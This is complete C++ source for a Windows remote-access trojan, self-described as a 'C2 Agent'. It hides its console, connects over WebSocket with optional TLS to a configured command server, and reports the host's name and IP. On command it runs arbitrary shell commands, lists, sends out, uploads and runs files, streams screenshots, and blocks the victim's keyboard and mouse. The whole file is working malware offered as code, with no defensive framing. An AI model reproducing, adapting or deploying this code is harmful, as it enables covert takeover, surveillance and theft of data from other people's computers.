
#include "vault.h"

#ifndef SERVER_TLS
#define SERVER_TLS 0
#endif

#ifndef SERVER_DEBUG
#define SERVER_DEBUG 0
#endif

#if SERVER_DEBUG
#define LOG(fmt, ...) fprintf(stderr, "[c2] " fmt "\n", ##__VA_ARGS__)
#else
#define LOG(fmt, ...) ((void)0)
#endif

#define UNICODE
#define _UNICODE
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <wingdi.h>
#include <gdiplus.h>
#include <shlobj.h>

#define SECURITY_WIN32
#include <sspi.h>
#include <schannel.h>

#include <objbase.h>    // IStream, CreateStreamOnHGlobal

#include <cstdio>
#include <cstring>
#include <cstdlib>
#include <string>
#include <vector>
#include <atomic>
#include <thread>
#include <mutex>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "gdiplus.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "secur32.lib")
#pragma comment(lib, "crypt32.lib")

static const char B64[] =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

static std::string b64_encode(const unsigned char *d, size_t len) {
    std::string out;
    out.reserve(((len + 2) / 3) * 4);
    for (size_t i = 0; i < len; i += 3) {
        unsigned char a = d[i], b = (i+1<len)?d[i+1]:0, c = (i+2<len)?d[i+2]:0;
        out += B64[a >> 2];
        out += B64[((a & 3) << 4) | (b >> 4)];
        out += (i+1<len) ? B64[((b & 0xF) << 2) | (c >> 6)] : '=';
        out += (i+2<len) ? B64[c & 0x3F] : '=';
    }
    return out;
}

static std::string b64_decode(const std::string &in) {
    static unsigned char T[256] = {0};
    static bool init = false;
    if (!init) {
        memset(T, 0xFF, 256);
        for (int i = 0; i < 64; i++) T[(unsigned char)B64[i]] = (unsigned char)i;
        init = true;
    }
    std::string out;
    unsigned val = 0; int bits = -8;
    for (unsigned char c : in) {
        if (T[c] == 0xFF) continue;
        val = (val << 6) | T[c];
        bits += 6;
        if (bits >= 0) { out += (char)((val >> bits) & 0xFF); bits -= 8; }
    }
    return out;
}

static std::string json_str(const std::string &j, const std::string &key) {
    std::string s = "\"" + key + "\":\"";
    size_t p = j.find(s);
    if (p == std::string::npos) return "";
    p += s.size();
    size_t e = j.find("\"", p);
    if (e == std::string::npos) return "";
    return j.substr(p, e - p);
}

static int json_int(const std::string &j, const std::string &key) {
    std::string s = "\"" + key + "\":";
    size_t p = j.find(s);
    if (p == std::string::npos) return 0;
    p += s.size();
    return atoi(j.c_str() + p);
}

static std::string escape_json(const std::string &s) {
    std::string out;
    for (char c : s) {
        if (c == '"') out += "\\\"";
        else if (c == '\\') out += "\\\\";
        else if (c == '\n') out += "\\n";
        else if (c == '\r') out += "\\r";
        else if (c == '\t') out += "\\t";
        else out += c;
    }
    return out;
}

// ── WebSocket client with optional TLS (Schannel) ──────────────────────────

class WsClient {
    SOCKET sock_ = INVALID_SOCKET;
    std::mutex send_mtx_;
    std::mutex tls_mtx_;
    bool last_timeout_ = false;

    // TLS state
    bool tls_ = false;
    CredHandle cred_ = {};
    CtxtHandle ctx_ = {};
    bool has_ctx_ = false;
    SecPkgContext_StreamSizes sizes_ = {};
    std::vector<char> enc_buf_;
    size_t enc_used_ = 0;
    std::vector<char> dec_buf_;
    size_t dec_off_ = 0;

    // ── raw socket I/O (bypasses TLS) ──────────────────────────────────

    int raw_send(const char *data, int len) {
        int sent = 0;
        while (sent < len) {
            int r = ::send(sock_, data + sent, len - sent, 0);
            if (r <= 0) return -1;
            sent += r;
        }
        return sent;
    }

    int raw_recv(char *buf, int maxlen) {
        int r = ::recv(sock_, buf, maxlen, 0);
        if (r < 0 && WSAGetLastError() == WSAETIMEDOUT) {
            last_timeout_ = true;
        }
        return r;
    }

    // ── TLS handshake (Schannel) ───────────────────────────────────────

    bool tls_handshake(const char *host) {
        LOG("TLS handshake iniciando com %s", host);
        SCHANNEL_CRED sc = {};
        sc.dwVersion = SCHANNEL_CRED_VERSION;
        sc.dwFlags = SCH_CRED_NO_DEFAULT_CREDS | SCH_CRED_MANUAL_CRED_VALIDATION;
        sc.grbitEnabledProtocols = SP_PROT_TLS1_2_CLIENT;

        SECURITY_STATUS ss = AcquireCredentialsHandleA(
            NULL, (SEC_CHAR*)"Microsoft Unified Security Protocol Provider",
            SECPKG_CRED_OUTBOUND, NULL, &sc, NULL, NULL, &cred_, NULL);
        if (FAILED(ss)) { LOG("TLS AcquireCredentials falhou: 0x%lx", ss); return false; }

        DWORD flags = ISC_REQ_SEQUENCE_DETECT | ISC_REQ_REPLAY_DETECT |
                      ISC_REQ_CONFIDENTIALITY | ISC_REQ_ALLOCATE_MEMORY |
                      ISC_REQ_STREAM | ISC_REQ_MANUAL_CRED_VALIDATION;
        DWORD out_flags = 0;

        // Initial call — no input token
        SecBuffer out_buf = { 0, SECBUFFER_TOKEN, NULL };
        SecBufferDesc out_desc = { SECBUFFER_VERSION, 1, &out_buf };

        ss = InitializeSecurityContextA(
            &cred_, NULL, (SEC_CHAR*)host, flags, 0, 0,
            NULL, 0, &ctx_, &out_desc, &out_flags, NULL);
        if (ss != SEC_I_CONTINUE_NEEDED) {
            FreeCredentialsHandle(&cred_);
            return false;
        }
        has_ctx_ = true;

        if (out_buf.cbBuffer > 0 && out_buf.pvBuffer) {
            if (raw_send((char*)out_buf.pvBuffer, out_buf.cbBuffer) < 0) {
                FreeContextBuffer(out_buf.pvBuffer);
                tls_cleanup();
                return false;
            }
            FreeContextBuffer(out_buf.pvBuffer);
        }

        // Handshake loop
        std::vector<char> hs(65536);
        int hs_used = 0;

        while (true) {
            int r = raw_recv(hs.data() + hs_used, (int)(hs.size() - hs_used));
            if (r <= 0) { tls_cleanup(); return false; }
            hs_used += r;

            SecBuffer in_bufs[2];
            in_bufs[0] = { (unsigned long)hs_used, SECBUFFER_TOKEN, hs.data() };
            in_bufs[1] = { 0, SECBUFFER_EMPTY, NULL };
            SecBufferDesc in_desc = { SECBUFFER_VERSION, 2, in_bufs };

            SecBuffer out_buf2 = { 0, SECBUFFER_TOKEN, NULL };
            SecBufferDesc out_desc2 = { SECBUFFER_VERSION, 1, &out_buf2 };

            ss = InitializeSecurityContextA(
                &cred_, &ctx_, (SEC_CHAR*)host, flags, 0, 0,
                &in_desc, 0, NULL, &out_desc2, &out_flags, NULL);

            if (ss == SEC_E_INCOMPLETE_MESSAGE) continue;

            if (out_buf2.cbBuffer > 0 && out_buf2.pvBuffer) {
                raw_send((char*)out_buf2.pvBuffer, out_buf2.cbBuffer);
                FreeContextBuffer(out_buf2.pvBuffer);
            }

            // Save extra data from handshake
            if (in_bufs[1].BufferType == SECBUFFER_EXTRA && in_bufs[1].cbBuffer > 0) {
                memmove(hs.data(), hs.data() + hs_used - in_bufs[1].cbBuffer,
                        in_bufs[1].cbBuffer);
                hs_used = in_bufs[1].cbBuffer;
            } else {
                hs_used = 0;
            }

            if (ss == SEC_E_OK) {
                LOG("TLS handshake OK");
                enc_buf_.resize(65536);
                if (hs_used > 0) {
                    memcpy(enc_buf_.data(), hs.data(), hs_used);
                    enc_used_ = hs_used;
                }
                break;
            }

            if (ss != SEC_I_CONTINUE_NEEDED) {
                tls_cleanup();
                return false;
            }
        }

        ss = QueryContextAttributes(&ctx_, SECPKG_ATTR_STREAM_SIZES, &sizes_);
        if (FAILED(ss)) { tls_cleanup(); return false; }

        tls_ = true;
        return true;
    }

    void tls_cleanup() {
        if (has_ctx_) { DeleteSecurityContext(&ctx_); has_ctx_ = false; }
        FreeCredentialsHandle(&cred_);
        tls_ = false;
        enc_used_ = 0;
        dec_buf_.clear();
        dec_off_ = 0;
    }

    // ── application-level I/O (transparent TLS) ────────────────────────

    int io_send(const char *data, int len) {
        if (!tls_) return raw_send(data, len);

        int total_len = (int)sizes_.cbHeader + len + (int)sizes_.cbTrailer;
        std::vector<char> buf(total_len);
        memcpy(buf.data() + sizes_.cbHeader, data, len);

        SecBuffer bufs[4];
        bufs[0] = { sizes_.cbHeader,  SECBUFFER_STREAM_HEADER,  buf.data() };
        bufs[1] = { (unsigned long)len, SECBUFFER_DATA,          buf.data() + sizes_.cbHeader };
        bufs[2] = { sizes_.cbTrailer, SECBUFFER_STREAM_TRAILER, buf.data() + sizes_.cbHeader + len };
        bufs[3] = { 0, SECBUFFER_EMPTY, NULL };
        SecBufferDesc desc = { SECBUFFER_VERSION, 4, bufs };

        {
            std::lock_guard<std::mutex> lock(tls_mtx_);
            if (FAILED(EncryptMessage(&ctx_, 0, &desc, 0))) return -1;
        }

        int enc_total = bufs[0].cbBuffer + bufs[1].cbBuffer + bufs[2].cbBuffer;
        return (raw_send(buf.data(), enc_total) < 0) ? -1 : len;
    }

    int io_recv(char *buf, int maxlen) {
        if (!tls_) return raw_recv(buf, maxlen);

        // Return already-decrypted data first
        if (dec_off_ < dec_buf_.size()) {
            int avail = (int)(dec_buf_.size() - dec_off_);
            int n = (avail < maxlen) ? avail : maxlen;
            memcpy(buf, dec_buf_.data() + dec_off_, n);
            dec_off_ += n;
            if (dec_off_ >= dec_buf_.size()) { dec_buf_.clear(); dec_off_ = 0; }
            return n;
        }

        if (enc_buf_.empty()) enc_buf_.resize(65536);

        while (true) {
            if (enc_used_ > 0) {
                SecBuffer dbufs[4];
                dbufs[0] = { (unsigned long)enc_used_, SECBUFFER_DATA, enc_buf_.data() };
                dbufs[1] = { 0, SECBUFFER_EMPTY, NULL };
                dbufs[2] = { 0, SECBUFFER_EMPTY, NULL };
                dbufs[3] = { 0, SECBUFFER_EMPTY, NULL };
                SecBufferDesc ddesc = { SECBUFFER_VERSION, 4, dbufs };

                SECURITY_STATUS ss;
                {
                    std::lock_guard<std::mutex> lock(tls_mtx_);
                    ss = DecryptMessage(&ctx_, &ddesc, 0, NULL);
                }

                if (ss == SEC_E_OK) {
                    char *pdata = NULL; int dlen = 0;
                    char *pextra = NULL; int elen = 0;
                    for (int i = 0; i < 4; i++) {
                        if (dbufs[i].BufferType == SECBUFFER_DATA && dbufs[i].cbBuffer > 0) {
                            pdata = (char*)dbufs[i].pvBuffer;
                            dlen = dbufs[i].cbBuffer;
                        }
                        if (dbufs[i].BufferType == SECBUFFER_EXTRA && dbufs[i].cbBuffer > 0) {
                            pextra = (char*)dbufs[i].pvBuffer;
                            elen = dbufs[i].cbBuffer;
                        }
                    }

                    if (pextra && elen > 0) {
                        memmove(enc_buf_.data(), pextra, elen);
                        enc_used_ = elen;
                    } else {
                        enc_used_ = 0;
                    }

                    if (pdata && dlen > 0) {
                        int n = (dlen < maxlen) ? dlen : maxlen;
                        memcpy(buf, pdata, n);
                        if (dlen > n) {
                            dec_buf_.assign(pdata + n, pdata + dlen);
                            dec_off_ = 0;
                        }
                        return n;
                    }
                    continue;
                }

                if (ss == SEC_E_INCOMPLETE_MESSAGE) {
                    // fall through to read more
                } else {
                    return -1;
                }
            }

            if (enc_used_ >= enc_buf_.size()) enc_buf_.resize(enc_buf_.size() * 2);
            int r = raw_recv(enc_buf_.data() + enc_used_, (int)(enc_buf_.size() - enc_used_));
            if (r <= 0) return -1;
            enc_used_ += r;
        }
    }

    bool recv_exact_int(char *buf, int n) {
        int got = 0;
        while (got < n) {
            int r = io_recv(buf + got, n - got);
            if (r <= 0) return false;
            got += r;
        }
        return true;
    }

public:
    bool connected() const { return sock_ != INVALID_SOCKET; }

    bool connect(const char *host, int port, const char *path) {
        LOG("Conectando TCP %s:%d ...", host, port);

        SOCKET s = INVALID_SOCKET;

        // Tentar getaddrinfo (IPv4)
        struct addrinfo hints = {}, *res = nullptr;
        hints.ai_family   = AF_INET;
        hints.ai_socktype = SOCK_STREAM;
        hints.ai_protocol = IPPROTO_TCP;
        char portStr[8];
        snprintf(portStr, sizeof(portStr), "%d", port);
        int gai = getaddrinfo(host, portStr, &hints, &res);

        if (gai == 0 && res) {
            s = socket(res->ai_family, res->ai_socktype, res->ai_protocol);
            if (s != INVALID_SOCKET) {
                if (::connect(s, res->ai_addr, (int)res->ai_addrlen) != 0) {
                    LOG("connect() falhou (err=%d)", WSAGetLastError());
                    closesocket(s); s = INVALID_SOCKET;
                }
            }
            freeaddrinfo(res);
        } else {
            LOG("getaddrinfo falhou (gai=%d wsa=%d), tentando gethostbyname...", gai, WSAGetLastError());
            if (res) freeaddrinfo(res);
        }

        // Fallback: gethostbyname (funciona em VMs com DNS limitado)
        if (s == INVALID_SOCKET) {
            struct hostent *he = gethostbyname(host);
            if (!he || he->h_addrtype != AF_INET || !he->h_addr_list[0]) {
                LOG("DNS falhou completamente para %s (wsa=%d)", host, WSAGetLastError());
                return false;
            }
            struct sockaddr_in addr = {};
            addr.sin_family = AF_INET;
            addr.sin_port   = htons((u_short)port);
            memcpy(&addr.sin_addr, he->h_addr_list[0], he->h_length);

            char ip[64];
            inet_ntop(AF_INET, &addr.sin_addr, ip, sizeof(ip));
            LOG("gethostbyname resolveu %s -> %s", host, ip);

            s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
            if (s == INVALID_SOCKET) { LOG("socket() falhou"); return false; }
            if (::connect(s, (struct sockaddr*)&addr, sizeof(addr)) != 0) {
                LOG("connect() falhou para %s:%d (err=%d)", ip, port, WSAGetLastError());
                closesocket(s);
                return false;
            }
        }

        sock_ = s;
        LOG("TCP conectado");

#if SERVER_TLS
        if (!tls_handshake(host)) { LOG("TLS handshake falhou"); disconnect(); return false; }
#endif

        // WebSocket handshake (goes through TLS if active)
        unsigned char rkey[16];
        for (int i = 0; i < 16; i++) rkey[i] = (unsigned char)(rand() & 0xFF);
        std::string wskey = b64_encode(rkey, 16);

        char req[1024];
        snprintf(req, sizeof(req),
            "GET %s HTTP/1.1\r\n"
            "Host: %s\r\n"
            "Upgrade: websocket\r\n"
            "Connection: Upgrade\r\n"
            "Sec-WebSocket-Key: %s\r\n"
            "Sec-WebSocket-Version: 13\r\n"
            "\r\n",
            path, host, wskey.c_str());
        io_send(req, (int)strlen(req));

        std::string resp;
        char c;
        while (true) {
            if (io_recv(&c, 1) != 1) { disconnect(); return false; }
            resp += c;
            if (resp.size() >= 4 && resp.substr(resp.size()-4) == "\r\n\r\n") break;
            if (resp.size() > 4096) { disconnect(); return false; }
        }
        if (resp.find("101") == std::string::npos) {
            LOG("WebSocket upgrade recusado (sem 101)");
            disconnect();
            return false;
        }
        LOG("WebSocket conectado");

        DWORD timeout_ms = 30000;
        setsockopt(sock_, SOL_SOCKET, SO_RCVTIMEO, (const char *)&timeout_ms, sizeof(timeout_ms));

        return true;
    }

    void disconnect() {
        LOG("Desconectado");
        if (tls_) tls_cleanup();
        if (sock_ != INVALID_SOCKET) { closesocket(sock_); sock_ = INVALID_SOCKET; }
    }

    bool send_text(const std::string &msg) {
        std::lock_guard<std::mutex> lock(send_mtx_);
        if (sock_ == INVALID_SOCKET) return false;

        size_t len = msg.size();
        std::vector<unsigned char> frame;

        frame.push_back(0x81);

        if (len < 126) {
            frame.push_back((unsigned char)(0x80 | len));
        } else if (len <= 0xFFFF) {
            frame.push_back(0x80 | 126);
            frame.push_back((unsigned char)(len >> 8));
            frame.push_back((unsigned char)(len & 0xFF));
        } else {
            frame.push_back(0x80 | 127);
            for (int i = 7; i >= 0; i--)
                frame.push_back((unsigned char)((len >> (i * 8)) & 0xFF));
        }

        unsigned char mask[4];
        for (int i = 0; i < 4; i++) mask[i] = (unsigned char)(rand() & 0xFF);
        frame.insert(frame.end(), mask, mask + 4);

        for (size_t i = 0; i < len; i++)
            frame.push_back((unsigned char)msg[i] ^ mask[i % 4]);

        int total = (int)frame.size();
        return io_send((const char*)frame.data(), total) >= 0;
    }

    bool was_timeout() const { return last_timeout_; }

    bool send_ping() {
        std::lock_guard<std::mutex> lock(send_mtx_);
        if (sock_ == INVALID_SOCKET) return false;
        unsigned char ping[6];
        ping[0] = 0x89;
        ping[1] = 0x80;
        unsigned char mask[4];
        for (int i = 0; i < 4; i++) mask[i] = (unsigned char)(rand() & 0xFF);
        memcpy(ping + 2, mask, 4);
        return io_send((const char*)ping, 6) >= 0;
    }

    std::string recv_text() {
        if (sock_ == INVALID_SOCKET) return "";
        last_timeout_ = false;

        unsigned char hdr[2];
        if (!recv_exact_int((char*)hdr, 2)) {
            if (last_timeout_) {
                LOG("Recv timeout — enviando ping keepalive");
                send_ping();
                return "";
            }
            disconnect();
            return "";
        }

        unsigned char opcode = hdr[0] & 0x0F;
        bool masked = (hdr[1] & 0x80) != 0;
        uint64_t plen = hdr[1] & 0x7F;

        if (plen == 126) {
            unsigned char ext[2];
            if (!recv_exact_int((char*)ext, 2)) { disconnect(); return ""; }
            plen = ((uint64_t)ext[0] << 8) | ext[1];
        } else if (plen == 127) {
            unsigned char ext[8];
            if (!recv_exact_int((char*)ext, 8)) { disconnect(); return ""; }
            plen = 0;
            for (int i = 0; i < 8; i++) plen = (plen << 8) | ext[i];
        }

        unsigned char mask[4] = {};
        if (masked && !recv_exact_int((char*)mask, 4)) { disconnect(); return ""; }

        if (plen > 64 * 1024 * 1024) { disconnect(); return ""; }

        std::string payload((size_t)plen, '\0');
        if (plen > 0 && !recv_exact_int(&payload[0], (int)plen)) { disconnect(); return ""; }
        if (masked) for (size_t i = 0; i < plen; i++) payload[i] ^= mask[i % 4];

        if (opcode == 0x8) { disconnect(); return ""; }
        if (opcode == 0x9) {
            std::lock_guard<std::mutex> lock(send_mtx_);
            unsigned char pong[2] = {0x8A, 0x00};
            io_send((const char*)pong, 2);
            return recv_text();
        }
        if (opcode == 0xA) {
            return recv_text();
        }
        return payload;
    }
};

// ── globals ────────────────────────────────────────────────────────────────

static WsClient g_ws;
static std::atomic<bool> g_input_blocked{false};
static std::atomic<bool> g_screen_running{false};
static HHOOK g_kbd_hook  = NULL;
static HHOOK g_mouse_hook = NULL;
static ULONG_PTR g_gdip_token = 0;

static LRESULT CALLBACK kbd_hook_proc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && g_input_blocked.load()) return 1;
    return CallNextHookEx(g_kbd_hook, nCode, wParam, lParam);
}

static LRESULT CALLBACK mouse_hook_proc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && g_input_blocked.load()) return 1;
    return CallNextHookEx(g_mouse_hook, nCode, wParam, lParam);
}

static DWORD WINAPI input_block_thread(LPVOID) {
    g_kbd_hook   = SetWindowsHookEx(WH_KEYBOARD_LL, kbd_hook_proc, NULL, 0);
    g_mouse_hook = SetWindowsHookEx(WH_MOUSE_LL, mouse_hook_proc, NULL, 0);

    MSG msg;
    while (g_input_blocked.load()) {
        if (PeekMessage(&msg, NULL, 0, 0, PM_REMOVE)) {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        } else {
            Sleep(10);
        }
    }

    if (g_kbd_hook)   { UnhookWindowsHookEx(g_kbd_hook);   g_kbd_hook = NULL; }
    if (g_mouse_hook) { UnhookWindowsHookEx(g_mouse_hook); g_mouse_hook = NULL; }
    return 0;
}

static void do_block_input() {
    if (g_input_blocked.load()) return;
    g_input_blocked.store(true);
    HANDLE h = CreateThread(NULL, 0, input_block_thread, NULL, 0, NULL);
    if (h) CloseHandle(h);
    g_ws.send_text("{\"type\":\"input_status\",\"blocked\":true}");
}

static void do_unblock_input() {
    g_input_blocked.store(false);
    Sleep(100);
    g_ws.send_text("{\"type\":\"input_status\",\"blocked\":false}");
}

static std::string run_command(const std::string &cmd) {
    std::string full = "cmd.exe /C " + cmd + " 2>&1";
    FILE *pipe = _popen(full.c_str(), "r");
    if (!pipe) return "[erro: _popen falhou]";
    std::string result;
    char buf[512];
    while (fgets(buf, sizeof(buf), pipe)) result += buf;
    _pclose(pipe);
    return result.empty() ? "[sem output]" : result;
}

static std::string list_dir(const std::string &dirPath) {
    std::string result = "[";
    WIN32_FIND_DATAA fd;
    std::string search = dirPath;
    if (search.back() != '\\' && search.back() != '/') search += "\\";
    search += "*";

    HANDLE h = FindFirstFileA(search.c_str(), &fd);
    if (h == INVALID_HANDLE_VALUE) return "[]";

    bool first = true;
    do {
        if (strcmp(fd.cFileName, ".") == 0) continue;
        if (!first) result += ",";
        first = false;
        bool is_dir = (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) != 0;
        ULONGLONG size = ((ULONGLONG)fd.nFileSizeHigh << 32) | fd.nFileSizeLow;
        result += "{\"name\":\"" + escape_json(fd.cFileName) + "\","
                  "\"dir\":" + (is_dir ? "true" : "false") + ","
                  "\"size\":" + std::to_string(size) + "}";
    } while (FindNextFileA(h, &fd));
    FindClose(h);
    result += "]";
    return result;
}

static void file_download(const std::string &filePath) {
    FILE *f = fopen(filePath.c_str(), "rb");
    if (!f) {
        g_ws.send_text("{\"type\":\"file_data\",\"path\":\"" + escape_json(filePath) +
                       "\",\"error\":\"cannot open file\"}");
        return;
    }
    fseek(f, 0, SEEK_END);
    long sz = ftell(f);
    fseek(f, 0, SEEK_SET);

    if (sz > 32 * 1024 * 1024) {
        fclose(f);
        g_ws.send_text("{\"type\":\"file_data\",\"path\":\"" + escape_json(filePath) +
                       "\",\"error\":\"file too large (>32MB)\"}");
        return;
    }

    std::vector<unsigned char> buf((size_t)sz);
    if (fread(buf.data(), 1, (size_t)sz, f) != (size_t)sz) {
        fclose(f);
        g_ws.send_text("{\"type\":\"file_data\",\"path\":\"" + escape_json(filePath) +
                       "\",\"error\":\"read error\"}");
        return;
    }
    fclose(f);

    std::string b64 = b64_encode(buf.data(), buf.size());
    g_ws.send_text("{\"type\":\"file_data\",\"path\":\"" + escape_json(filePath) +
                   "\",\"size\":" + std::to_string(sz) +
                   ",\"data\":\"" + b64 + "\"}");
}

static void file_upload(const std::string &filePath, const std::string &b64data) {
    std::string raw = b64_decode(b64data);
    FILE *f = fopen(filePath.c_str(), "wb");
    if (!f) {
        g_ws.send_text("{\"type\":\"file_upload_result\",\"ok\":false,"
                       "\"error\":\"cannot write file\"}");
        return;
    }
    if (fwrite(raw.data(), 1, raw.size(), f) != raw.size()) {
        fclose(f);
        g_ws.send_text("{\"type\":\"file_upload_result\",\"ok\":false,"
                       "\"error\":\"write incomplete\"}");
        return;
    }
    fclose(f);
    g_ws.send_text("{\"type\":\"file_upload_result\",\"ok\":true,\"path\":\"" +
                   escape_json(filePath) + "\",\"size\":" + std::to_string(raw.size()) + "}");
}

static void file_exec(const std::string &filePath) {
    STARTUPINFOA si = {}; si.cb = sizeof(si);
    PROCESS_INFORMATION pi = {};
    char cmd[MAX_PATH];
    strncpy(cmd, filePath.c_str(), MAX_PATH - 1);
    BOOL ok = CreateProcessA(NULL, cmd, NULL, NULL, FALSE,
                             CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    if (ok) {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        g_ws.send_text("{\"type\":\"file_exec_result\",\"ok\":true,\"path\":\"" +
                       escape_json(filePath) + "\"}");
    } else {
        g_ws.send_text("{\"type\":\"file_exec_result\",\"ok\":false,\"error\":\"CreateProcess failed: " +
                       std::to_string(GetLastError()) + "\"}");
    }
}

static int get_encoder_clsid(const WCHAR *format, CLSID *pClsid) {
    UINT num = 0, sz = 0;
    Gdiplus::GetImageEncodersSize(&num, &sz);
    if (sz == 0) return -1;
    auto *info = (Gdiplus::ImageCodecInfo *)malloc(sz);
    if (!info) return -1;
    Gdiplus::GetImageEncoders(num, sz, info);
    for (UINT i = 0; i < num; i++) {
        if (wcscmp(info[i].MimeType, format) == 0) {
            *pClsid = info[i].Clsid;
            free(info);
            return (int)i;
        }
    }
    free(info);
    return -1;
}

// Captura a tela, codifica em JPEG na memória e retorna base64.
static std::string capture_screen_jpeg(int quality = 60) {
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);
    if (w == 0 || h == 0) return "";

    int sw = w / 2, sh = h / 2;

    HDC     scr  = GetDC(NULL);
    if (!scr) return "";
    HDC     mem  = CreateCompatibleDC(scr);
    HBITMAP hbmp = CreateCompatibleBitmap(scr, sw, sh);
    HGDIOBJ old  = SelectObject(mem, hbmp);
    SetStretchBltMode(mem, HALFTONE);
    StretchBlt(mem, 0, 0, sw, sh, scr, 0, 0, w, h, SRCCOPY);
    SelectObject(mem, old);
    DeleteDC(mem);
    ReleaseDC(NULL, scr);

    Gdiplus::Bitmap *gdip = Gdiplus::Bitmap::FromHBITMAP(hbmp, NULL);
    DeleteObject(hbmp);
    if (!gdip) return "";

    CLSID clsid;
    if (get_encoder_clsid(L"image/jpeg", &clsid) < 0) { delete gdip; return ""; }

    Gdiplus::EncoderParameters ep;
    ep.Count = 1;
    ep.Parameter[0].Guid           = Gdiplus::EncoderQuality;
    ep.Parameter[0].Type           = Gdiplus::EncoderParameterValueTypeLong;
    ep.Parameter[0].NumberOfValues = 1;
    ULONG q = (ULONG)quality;
    ep.Parameter[0].Value          = &q;

    IStream *stream = nullptr;
    if (FAILED(CreateStreamOnHGlobal(NULL, TRUE, &stream))) { delete gdip; return ""; }

    Gdiplus::Status st = gdip->Save(stream, &clsid, &ep);
    delete gdip;
    if (st != Gdiplus::Ok) { stream->Release(); return ""; }

    STATSTG stats = {};
    stream->Stat(&stats, STATFLAG_NONAME);
    ULONGLONG size = stats.cbSize.QuadPart;
    if (size == 0) { stream->Release(); return ""; }

    LARGE_INTEGER zero = {};
    stream->Seek(zero, STREAM_SEEK_SET, NULL);

    std::vector<unsigned char> data((size_t)size);
    ULONG rd = 0;
    stream->Read(data.data(), (ULONG)size, &rd);
    stream->Release();

    if (rd == 0) return "";
    return b64_encode(data.data(), rd);
}

// Loop: tira print → converte para base64 → envia → aguarda 200ms → repete.
static void screen_thread_fn() {
    CoInitialize(NULL);

    while (g_screen_running.load()) {
        std::string b64 = capture_screen_jpeg(60);
        if (!b64.empty()) {
            g_ws.send_text("{\"type\":\"screen_frame\",\"data\":\"" + b64 + "\"}");
        }
        Sleep(200);
    }

    CoUninitialize();
}

static std::string get_machine_name() {
    char buf[MAX_COMPUTERNAME_LENGTH + 1] = {};
    DWORD sz = sizeof(buf);
    GetComputerNameA(buf, &sz);
    return buf;
}

static std::string get_os_version() {
    return "Windows";
}

static std::string get_local_ip() {
    char host[256] = {};
    gethostname(host, sizeof(host));
    struct addrinfo hints = {}, *res = nullptr;
    hints.ai_family = AF_INET;
    if (getaddrinfo(host, NULL, &hints, &res) != 0) return "0.0.0.0";
    char ip[64] = {};
    struct sockaddr_in *addr = (struct sockaddr_in *)res->ai_addr;
    inet_ntop(AF_INET, &addr->sin_addr, ip, sizeof(ip));
    freeaddrinfo(res);
    return ip;
}

static void handle_message(const std::string &msg) {
    std::string type = json_str(msg, "type");

    if (type == "registered") {
        return;
    }

    if (type == "cmd") {
        std::string command = json_str(msg, "command");
        std::string output  = run_command(command);
        g_ws.send_text("{\"type\":\"cmd_result\",\"output\":\"" + escape_json(output) + "\"}");
        return;
    }

    if (type == "file_list") {
        std::string path = json_str(msg, "path");
        std::string entries = list_dir(path);
        g_ws.send_text("{\"type\":\"file_list_result\",\"path\":\"" + escape_json(path) +
                       "\",\"entries\":" + entries + "}");
        return;
    }

    if (type == "file_download") {
        file_download(json_str(msg, "path"));
        return;
    }

    if (type == "file_upload") {
        file_upload(json_str(msg, "path"), json_str(msg, "data"));
        return;
    }

    if (type == "file_exec") {
        file_exec(json_str(msg, "path"));
        return;
    }

    if (type == "block_input") {
        do_block_input();
        return;
    }

    if (type == "unblock_input") {
        do_unblock_input();
        return;
    }

    if (type == "screen_start") {
        if (!g_screen_running.load()) {
            g_screen_running.store(true);
            std::thread(screen_thread_fn).detach();
        }
        return;
    }

    if (type == "screen_stop") {
        g_screen_running.store(false);
        return;
    }
}

int main(void) {
#if !SERVER_DEBUG
    HWND console = GetConsoleWindow();
    if (console) ShowWindow(console, SW_HIDE);
#endif

    LOG("=== C2 Agent iniciando ===");
    LOG("Host: %s  Port: %d  Path: %s  TLS: %d", SERVER_HOST, SERVER_PORT, SERVER_PATH, SERVER_TLS);

    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        LOG("WSAStartup falhou");
        return 1;
    }

    Gdiplus::GdiplusStartupInput gdipInput;
    Gdiplus::Status gdipStatus = Gdiplus::GdiplusStartup(&g_gdip_token, &gdipInput, NULL);
    if (gdipStatus != Gdiplus::Ok) {
        LOG("GDI+ falhou");
        WSACleanup();
        return 1;
    }
    CoInitialize(NULL);

    srand((unsigned)GetTickCount());

    std::string machine_name = get_machine_name();
    std::string os_ver       = get_os_version();
    std::string local_ip     = get_local_ip();
    LOG("Machine: %s  IP: %s", machine_name.c_str(), local_ip.c_str());

    while (true) {
        if (!g_ws.connected()) {
            LOG("Tentando conectar %s:%d ...", SERVER_HOST, SERVER_PORT);
            if (!g_ws.connect(SERVER_HOST, SERVER_PORT, SERVER_PATH)) {
                LOG("Conexao falhou, retry em 5s");
                Sleep(5000);
                continue;
            }

            std::string reg = "{\"type\":\"register\","
                              "\"name\":\"" + escape_json(machine_name) + "\","
                              "\"os\":\"" + escape_json(os_ver) + "\","
                              "\"ip\":\"" + escape_json(local_ip) + "\"}";
            g_ws.send_text(reg);
            LOG("Register enviado");
        }

        std::string msg = g_ws.recv_text();
        if (msg.empty()) {
            if (g_ws.connected()) {
                continue;
            }
            LOG("Conexao perdida — reconectando em 3s");
            g_screen_running.store(false);
            g_input_blocked.store(false);
            Sleep(3000);
            continue;
        }

        if (msg.front() != '{' || msg.back() != '}') {
            continue;
        }

        std::string type = json_str(msg, "type");
        if (type.empty()) {
            continue;
        }

        LOG("Msg recebida: type=%s", type.c_str());
        handle_message(msg);
    }

    Gdiplus::GdiplusShutdown(g_gdip_token);
    CoUninitialize();
    WSACleanup();
    return 0;
}
